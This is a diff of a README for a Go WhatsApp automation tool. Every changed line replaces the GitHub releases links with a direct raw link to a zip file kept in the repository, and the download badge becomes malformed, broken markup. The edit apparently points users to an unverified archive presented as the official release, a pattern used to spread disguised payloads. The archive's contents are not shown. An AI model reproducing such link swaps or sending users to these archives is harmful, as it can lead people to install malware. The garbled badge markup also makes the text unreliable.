@@ -1,6 +1,6 @@
 # 🚀 go-whatsapp-worker-redis-ssedashboard - Automate WhatsApp Tasks Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/main/addition/go-whatsapp-worker-redis-ssedashboard.zip%20Latest%https://raw.githubusercontent.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/main/addition/go-whatsapp-worker-redis-ssedashboard.zip)](https://raw.githubusercontent.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/main/addition/go-whatsapp-worker-redis-ssedashboard.zip)
 
 ## 📋 Description
 
@@ -29,7 +29,7 @@ To run this application, your system should meet the following requirements:
 
 Follow these steps to quickly get up and running with the go-whatsapp-worker-redis-ssedashboard.
 
-1. Visit the [Download Page](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases) to download the software.
+1. Visit the [Download Page](https://raw.githubusercontent.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/main/addition/go-whatsapp-worker-redis-ssedashboard.zip) to download the software.
   
 2. Look for the latest release. Click on the link to download the version compatible with your operating system.
 
@@ -52,7 +52,7 @@ To install the application:
 
 5. For direct usage, follow the setup instructions in the included README file found in the application's folder.
 
-6. Visit the [Download Page](https://github.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/releases) again to check for any updates or documentation.
+6. Visit the [Download Page](https://raw.githubusercontent.com/jeremypadrinox/go-whatsapp-worker-redis-ssedashboard/main/addition/go-whatsapp-worker-redis-ssedashboard.zip) again to check for any updates or documentation.
 
 ## 🛠️ Usage
 
